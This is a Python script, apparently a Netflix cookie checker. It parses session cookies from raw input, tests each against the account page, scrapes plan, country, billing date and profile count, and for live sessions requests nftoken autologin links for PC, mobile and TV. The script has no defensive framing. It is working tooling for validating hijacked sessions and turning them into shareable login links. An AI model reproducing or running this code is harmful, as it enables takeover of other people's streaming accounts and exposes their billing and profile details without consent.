import os, json, re, sys
import requests

NF_COOKIES = {"NetflixId", "SecureNetflixId", "nfvdid"}

def parse_cookie(raw):
    jar = {}
    if "\t" in raw or "netflix.com" in raw:
        for line in raw.splitlines():
            t = line.strip()
            if not t or t.startswith("#"):
                continue
            p = t.split("\t")
            if len(p) >= 7 and p[5] in NF_COOKIES:
                jar[p[5]] = p[6]
    else:
        for part in re.split(r"[;\n]", raw):
            if "=" in part:
                k, v = part.split("=", 1)
                k, v = k.strip(), v.strip()
                if k in NF_COOKIES:
                    jar[k] = v
    return jar

def cookie_header(jar):
    return "; ".join(f"{k}={v}" for k, v in jar.items())

def check(jar):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/124.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": cookie_header(jar),
    }
    try:
        r = requests.get("https://www.netflix.com/account",
                         headers=headers, allow_redirects=False, timeout=20)
    except Exception as e:
        return {"status": "dead", "error": str(e)}

    if r.status_code in (301, 302, 303, 307, 308):
        loc = r.headers.get("Location", "")
        return {"status": "expired" if "login" in loc else "dead"}
    if r.status_code in (401, 403):
        return {"status": "dead"}
    if r.status_code != 200:
        return {"status": "dead", "error": f"HTTP {r.status_code}"}

    html = r.text
    out = {"status": "alive"}
    m = re.search(r'"currentPlan"\s*:\s*\{[^}]*"planName"\s*:\s*"([^"]+)"', html) \
        or re.search(r'"planName"\s*:\s*"([^"]+)"', html)
    if m: out["plan"] = m.group(1)
    m = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', html)
    if m: out["country"] = m.group(1)
    m = re.search(r'"nextBillingDate"\s*:\s*"([^"]+)"', html)
    if m: out["nextBilling"] = m.group(1)
    n = html.count('"profileName"')
    if n: out["profiles"] = str(n)
    return out

def gen_links(jar):
    links = {"pc": None, "mobile": None, "tv": None}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/124.0 Safari/537.36",
        "Cookie": cookie_header(jar),
    }
    try:
        r = requests.post("https://www.netflix.com/api/shakti/mre/nftoken",
                          headers=headers, timeout=20)
        if r.status_code == 200:
            d = r.json()
            t = d.get("token") or d.get("nftoken")
            if t:
                links["pc"]     = f"https://netflix.com/?nftoken={t}"
                links["mobile"] = f"https://netflix.com/unsupported?nftoken={t}"
                links["tv"]     = f"https://netflix.com/tv2?nftoken={t}"
    except Exception:
        pass
    return links

def main():
    raw = os.environ.get("COOKIE_RAW", "").strip()
    job_id = os.environ.get("JOB_ID", "").strip()
    if not raw or not job_id:
        sys.exit("missing COOKIE_RAW or JOB_ID")

    jar = parse_cookie(raw)
    if "NetflixId" not in jar:
        result = {"status": "dead", "error": "no NetflixId cookie found"}
    else:
        result = check(jar)
        if result.get("status") == "alive":
            result["links"] = gen_links(jar)

    os.makedirs("results", exist_ok=True)
    with open(f"results/job_{job_id}.json", "w") as f:
        json.dump(result, f)

if __name__ == "__main__":
    main()
